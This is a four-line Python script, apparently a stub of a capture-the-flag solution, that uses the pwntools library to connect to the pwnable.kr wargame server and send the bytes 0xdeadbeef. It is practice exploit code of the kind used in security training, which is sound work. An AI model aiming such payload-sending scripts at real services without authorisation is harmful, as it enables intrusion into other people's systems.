from pwn import *

r = remote('pwnable.kr', 1234)
r.send('\xde\xad\xbe\xef')

